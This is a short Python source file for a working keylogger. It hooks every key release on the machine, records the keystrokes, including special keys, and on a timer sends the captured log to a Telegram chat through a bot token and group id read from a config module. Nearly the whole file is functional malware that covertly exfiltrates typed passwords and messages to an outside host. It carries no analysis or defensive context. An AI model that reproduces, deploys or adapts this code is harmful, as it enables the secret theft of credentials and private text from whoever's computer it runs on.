import keyboard
from threading import Semaphore, Timer
import conf_management as conf
from telegram.ext import Updater


SEND_REPORT_EVERY = conf.get_report_every()


class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        
        self.semaphore = Semaphore(0)

    def callback(self, event):        
        name = event.name
        if len(name) > 1:
            # Special keys
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    def send_telegram(self, message):
        update = Updater(token=conf.get_telegram_token())
        update.bot.send_message(chat_id=conf.get_telegram_group_id(), text=message)        

    def report(self):        
        if self.log:
            print(self.log)
            self.send_telegram(self.log)

        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()

        self.semaphore.acquire()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()